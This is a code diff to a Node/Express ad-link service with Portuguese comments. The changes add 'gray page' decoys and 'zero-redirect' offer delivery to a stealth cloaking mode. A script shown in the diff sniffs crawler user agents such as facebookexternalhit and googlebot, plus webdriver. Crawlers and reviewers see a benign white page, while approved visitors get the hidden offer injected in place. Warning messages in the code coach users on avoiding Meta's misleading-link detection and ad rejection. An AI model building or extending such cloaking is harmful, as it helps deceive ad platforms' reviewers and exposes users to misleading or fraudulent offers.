@@ -1325,6 +1325,9 @@ app.post('/api/sites', async (req, res) => {
   const userId = req.session.userId;
   const behavior = normalizeBlockBehavior(block_behavior || 'stealth');
   const lpId = resolveLandingPageId(behavior, landing_page_id);
+  const grayId = resolveOptionalPageId(req.body.gray_page_id);
+  const offerPageId = resolveOptionalPageId(req.body.offer_page_id);
+  const offerDelivery = normalizeOfferDelivery(req.body.offer_delivery);
   const selDomain = (selected_domain || '').trim() || null;
   const useFb = use_fallback === false || use_fallback === 0 ? 0 : 1;
   const pathPrefixRegex = /^[a-z0-9_-]{1,32}$/i;
@@ -1337,8 +1340,8 @@ app.post('/api/sites', async (req, res) => {
   }
   try {
     const defaultParams = (req.body.default_link_params || '').trim() || null;
-    await db.run(`INSERT INTO sites (site_id, link_code, user_id, name, domain, target_url, redirect_url, block_behavior, default_link_params, allowed_countries, blocked_countries, block_desktop, block_facebook_library, block_bots, block_vpn, block_devtools, required_ref_token, landing_page_id, selected_domain, use_fallback, path_prefix, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, 1, 1, 1, 1, ?, ?, ?, ?, ?, datetime('now'))`,
-      [siteId, linkCode, userId, name, domain, target, redirect_url || 'https://www.google.com/', behavior, defaultParams, countriesNorm.allowed, countriesNorm.blocked, refToken, lpId, selDomain, useFb, pathPrefix]);
+    await db.run(`INSERT INTO sites (site_id, link_code, user_id, name, domain, target_url, redirect_url, block_behavior, default_link_params, allowed_countries, blocked_countries, block_desktop, block_facebook_library, block_bots, block_vpn, block_devtools, required_ref_token, landing_page_id, gray_page_id, offer_page_id, offer_delivery, selected_domain, use_fallback, path_prefix, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, 1, 1, 1, 1, ?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))`,
+      [siteId, linkCode, userId, name, domain, target, redirect_url || 'https://www.google.com/', behavior, defaultParams, countriesNorm.allowed, countriesNorm.blocked, refToken, lpId, grayId, offerPageId, offerDelivery, selDomain, useFb, pathPrefix]);
     const site = await db.get('SELECT * FROM sites WHERE site_id = ?', [siteId]);
     res.json(site);
   } catch (error) {
@@ -1362,6 +1365,9 @@ app.put('/api/sites/:siteId', async (req, res) => {
     const blockBehavior = normalizeBlockBehavior(data.block_behavior);
     const defaultParams = (data.default_link_params || '').trim() || null;
     const lpId = resolveLandingPageId(blockBehavior, data.landing_page_id);
+    const grayId = resolveOptionalPageId(data.gray_page_id);
+    const offerPageId = resolveOptionalPageId(data.offer_page_id);
+    const offerDelivery = normalizeOfferDelivery(data.offer_delivery);
     const selDomain = (data.selected_domain || '').trim() || null;
     const newTarget = (data.target_url || '').trim() || null;
     const targetChanged = ((existing.target_url || '').trim() || null) !== newTarget;
@@ -1375,7 +1381,7 @@ app.put('/api/sites/:siteId', async (req, res) => {
         name = ?, domain = ?, link_code = ?, target_url = ?, redirect_url = ?, block_behavior = ?, default_link_params = ?,
         block_desktop = ?, block_facebook_library = ?, block_bots = ?,
         block_vpn = ?, block_devtools = ?,
-        allowed_countries = ?, blocked_countries = ?, is_active = ?, required_ref_token = ?, selected_domain = ?, landing_page_id = ?, use_fallback = ?, path_prefix = ?${clearFallback}
+        allowed_countries = ?, blocked_countries = ?, is_active = ?, required_ref_token = ?, selected_domain = ?, landing_page_id = ?, gray_page_id = ?, offer_page_id = ?, offer_delivery = ?, use_fallback = ?, path_prefix = ?${clearFallback}
       WHERE site_id = ?
     `;
     const countriesNorm = normalizeAllowedBlockedCountries(data.allowed_countries, data.blocked_countries);
@@ -1384,7 +1390,7 @@ app.put('/api/sites/:siteId', async (req, res) => {
       data.block_desktop ? 1 : 0, data.block_facebook_library ? 1 : 0, data.block_bots ? 1 : 0,
       data.block_vpn ? 1 : 0, data.block_devtools ? 1 : 0,
       countriesNorm.allowed, countriesNorm.blocked, data.is_active ? 1 : 0, refToken,
-      selDomain, lpId, useFb, pathPrefix,
+      selDomain, lpId, grayId, offerPageId, offerDelivery, useFb, pathPrefix,
       req.params.siteId
     ]);
     res.json({ success: true });
@@ -1503,9 +1509,12 @@ app.get('/api/sites/:siteId/link-health', async (req, res) => {
       message: 'O mesmo link leva a destinos diferentes conforme o perfil (oferta vs bloqueio). É exatamente o padrão "link enganoso / redirecionamentos" do Meta. Ative o modo Stealth no site.'
     });
   } else if (isStealthMode(site)) {
+    const zeroRedirect = normalizeOfferDelivery(site.offer_delivery) === 'page' && site.offer_page_id;
     metaRisk.push({
-      level: 'info',
-      message: 'Modo Stealth (ponte unificada): mesma resposta HTML para crawler e clique. Cadastre white page em Páginas com o mesmo tema da oferta.'
+      level: zeroRedirect ? 'info' : 'medium',
+      message: zeroRedirect
+        ? 'Stealth + Zero-Redirect: crawler vê white page; lead aprovado recebe oferta na mesma URL (sem 302). Alinhe white page, gray page e oferta ao criativo do anúncio.'
+        : 'Modo Stealth com oferta externa: após o POST ainda há redirect para outro domínio. Para reduzir reprovação no Meta, use oferta em Páginas (Zero-Redirect).'
     });
   }
   if (redirectChain.length > 2) {
@@ -2142,6 +2151,25 @@ function resolveLandingPageId(blockBehavior, landingPageId) {
   return Number.isFinite(id) && id > 0 ? id : null;
 }
 
+function resolveOptionalPageId(pageId) {
+  if (pageId == null || pageId === '') return null;
+  const id = parseInt(pageId, 10);
+  return Number.isFinite(id) && id > 0 ? id : null;
+}
+
+function normalizeOfferDelivery(value) {
+  return (value || 'url').toString().toLowerCase() === 'page' ? 'page' : 'url';
+}
+
+function siteHasOfferDestination(site) {
+  if (!site) return false;
+  if (isStealthMode(site)) {
+    if (normalizeOfferDelivery(site.offer_delivery) === 'page' && site.offer_page_id) return true;
+    return !!getEffectiveTargetUrl(site);
+  }
+  return !!getEffectiveTargetUrl(site);
+}
+
 /** Stealth só para sites novos (criados após o lançamento). Campanhas antigas permanecem redirect. */
 const STEALTH_LAUNCH_DATE = '2026-06-23';
 
@@ -2182,8 +2210,20 @@ const STEALTH_DEFAULT_BRIDGE_HTML = `
 
 function buildStealthNavScript(prefix, code) {
   const navPath = '/api/n/' + prefix + '/' + code;
-  // Só crawlers param no HTML; demais browsers fazem POST — servidor decide (ref, utm, país, etc.)
-  return `<script>(function(){try{var p=${JSON.stringify(navPath)};var u=navigator.userAgent.toLowerCase();if(/facebookexternalhit|facebot|facebookcatalog|meta-externalagent|meta-inspector|instagrambot|googlebot|bingbot|yandex|bot|crawl|spider|headless|lighthouse|preview|whatsapp|slurp|duckduck/i.test(u))return;if(navigator.webdriver)return;fetch(p+(location.search||''),{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:'{}'}).then(function(r){return r.json()}).then(function(d){if(d&&d.next)setTimeout(function(){location.replace(d.next)},120+(Math.random()*180|0))}).catch(function(){})}catch(e){}})();</script>`;
+  // Crawlers param no HTML; demais browsers fazem POST — resposta inline (zero-redirect) ou next URL
+  return `<script>(function(){try{var p=${JSON.stringify(navPath)};var u=navigator.userAgent.toLowerCase();if(/facebookexternalhit|facebot|facebookcatalog|meta-externalagent|meta-inspector|instagrambot|googlebot|bingbot|yandex|bot|crawl|spider|headless|lighthouse|preview|whatsapp|slurp|duckduck/i.test(u))return;if(navigator.webdriver)return;fetch(p+(location.search||''),{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:'{}'}).then(function(r){return r.json()}).then(function(d){if(!d)return;if(d.inline&&d.html){try{document.open();document.write(d.html);document.close()}catch(e){}return}if(d.next)setTimeout(function(){location.replace(d.next)},120+(Math.random()*180|0))}).catch(function(){})}catch(e){}})();</script>`;
+}
+
+async function getUserPageHtml(pageId, userId) {
+  if (!pageId || !userId) return null;
+  const page = await db.get('SELECT html_content FROM landing_pages WHERE id = ? AND user_id = ?', [pageId, userId]);
+  if (!page || page.html_content == null || !String(page.html_content).trim()) return null;
+  return String(page.html_content);
+}
+
+function wrapPageHtmlFragment(inner) {
+  if (/<html[\s>]/i.test(inner)) return inner;
+  return `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Conteúdo</title></head><body>${inner}</body></html>`;
 }
 
 async function getStealthBridgeInnerHtml(site) {
@@ -3051,14 +3091,14 @@ function evaluateLinkVisitStealth(site, ctx) {
     blocked: false,
     blockReason: null,
     reviewerBypass: false,
-    offerUrl: destUrl,
+    offerUrl: destUrl || (site && site.offer_page_id ? `page:${site.offer_page_id}` : null),
     safeUrl,
     blockBehavior,
     redirectTarget: destUrl,
     redirectMode: 'offer',
     sameUrlDelivery: isStealthMode(site)
   };
-  if (!site || !destUrl) {
+  if (!site || !siteHasOfferDestination(site)) {
     out.blocked = true;
     out.blockReason = 'Site ou URL de destino inválidos';
     out.redirectTarget = safeUrl;
@@ -3139,8 +3179,10 @@ function evaluateLinkVisitStealth(site, ctx) {
     else if (shouldEmbedBlock(site, userAgent)) out.redirectMode = 'embed';
     else out.redirectMode = 'safe';
   } else {
-    out.redirectTarget = destUrl;
-    out.redirectMode = blockBehavior === 'stealth' ? 'bridge' : (shouldSoftRedirectOffer(site) ? 'soft_offer' : 'offer');
+    out.redirectTarget = destUrl || out.offerUrl;
+    out.redirectMode = blockBehavior === 'stealth'
+      ? (normalizeOfferDelivery(site.offer_delivery) === 'page' ? 'inline_offer' : 'bridge')
+      : (shouldSoftRedirectOffer(site) ? 'soft_offer' : 'offer');
   }
   return out;
 }
@@ -3163,9 +3205,14 @@ function getMetaLinkConfigWarnings(site) {
   if (safe.includes('google.com')) warnings.push({ level: 'high', code: 'safe_google', message: 'URL de bloqueio é Google — destino muito diferente da oferta (Meta costuma marcar como link enganoso). Prefira uma página no mesmo tema/domínio.' });
   if (normalizeBlockBehavior(site.block_behavior) === 'stealth') {
     if (!site.landing_page_id) {
-      warnings.push({ level: 'high', code: 'stealth_no_page', message: 'Modo Stealth marcado, mas sem página da ponte selecionada — o link funciona como redirect (302) até você escolher uma página em Páginas.' });
+      warnings.push({ level: 'high', code: 'stealth_no_page', message: 'Modo Stealth marcado, mas sem white page — o link funciona como redirect 302 até você escolher uma página em Páginas.' });
+    } else if (normalizeOfferDelivery(site.offer_delivery) === 'page' && site.offer_page_id) {
+      warnings.push({ level: 'info', code: 'stealth_zero_redirect', message: 'Zero-Redirect ativo: oferta entregue na mesma URL (página interna), sem salto para outro domínio.' });
     } else {
-      warnings.push({ level: 'info', code: 'stealth', message: 'Modo Stealth ativo com white page: crawler e lead recebem o mesmo HTML na URL do link.' });
+      warnings.push({ level: 'medium', code: 'stealth_external_offer', message: 'Oferta em URL externa: após a white page há redirect para outro domínio. Para Meta Ads, prefira "Oferta em Páginas (Zero-Redirect)".' });
+    }
+    if (!site.gray_page_id) {
+      warnings.push({ level: 'low', code: 'no_gray_page', message: 'Sem Gray Page: visitantes bloqueados ficam na white page. Configure uma página cinza (isca) em Páginas para bots e revisores.' });
     }
   } else if (normalizeBlockBehavior(site.block_behavior) === 'embed') {
     warnings.push({ level: 'medium', code: 'embed', message: 'Modo embed: bloqueio na mesma URL; leads ainda usam redirect 302 (Meta pode comparar).' });
@@ -3250,7 +3297,7 @@ const LINK_HEALTH_PROFILES = [
   }
 ];
 
-// Navegação pós-ponte Stealth — destino só via POST (não aparece no HTML inicial)
+// Navegação pós-ponte Stealth — destino via POST (inline na mesma URL ou redirect externo)
 async function handleStealthNavigation(req, res) {
   const prefix = (req.params.prefix || '').toLowerCase().trim();
   const code = (req.params.code || '').toLowerCase();
@@ -3261,16 +3308,25 @@ async function handleStealthNavigation(req, res) {
   if (isMetaCrawlerUA(ua)) return res.json({ next: null });
 
   const site = await db.get('SELECT * FROM sites WHERE link_code = ? AND is_active = 1', [code]);
-  const destUrl = getEffectiveTargetUrl(site);
-  if (!site || !destUrl || !isStealthMode(site)) return res.status(404).json({ error: 'Not found' });
+  if (!site || !isStealthMode(site) || !siteHasOfferDestination(site)) return res.status(404).json({ error: 'Not found' });
   if (!(await validateSiteLinkPrefix(req, site))) return res.status(404).json({ error: 'Not found' });
 
   const ctx = await resolveLinkVisitContext(req, site, { skipRefCheck: false, enforceRefOnNavigate: !!site.required_ref_token });
   void db.run(ctx.visitorSql, ctx.visitorParams).catch((err) => console.error('[visitor] stealth nav:', err.message));
 
   if (ctx.decision.blocked || ctx.decision.reviewerBypass) {
+    if (site.gray_page_id) {
+      const grayHtml = await getUserPageHtml(site.gray_page_id, site.user_id);
+      if (grayHtml) return res.json({ inline: true, html: wrapPageHtmlFragment(grayHtml) });
+    }
     return res.json({ next: null });
   }
+
+  if (normalizeOfferDelivery(site.offer_delivery) === 'page' && site.offer_page_id) {
+    const offerHtml = await getUserPageHtml(site.offer_page_id, site.user_id);
+    if (offerHtml) return res.json({ inline: true, html: wrapPageHtmlFragment(offerHtml) });
+  }
+
   return res.json({ next: ctx.destWithQs });
 }
 
@@ -3287,10 +3343,10 @@ async function handleLinkRedirect(req, res) {
   const prefix = (req.params.prefix || '').toLowerCase().trim();
   const code = (req.params.code || '').toLowerCase();
   const site = await db.get('SELECT * FROM sites WHERE link_code = ? AND is_active = 1', [code]);
-  const destUrl = getEffectiveTargetUrl(site);
-  if (!site || !destUrl) {
+  if (!site || !siteHasOfferDestination(site)) {
     return redirectWithDelay(res, 'https://www.google.com/');
   }
+  const destUrl = getEffectiveTargetUrl(site);
   if (!(await validateSiteLinkPrefix(req, site))) {
     return res.status(404).type('html').send(LINK_PUBLIC_404_HTML);
   }
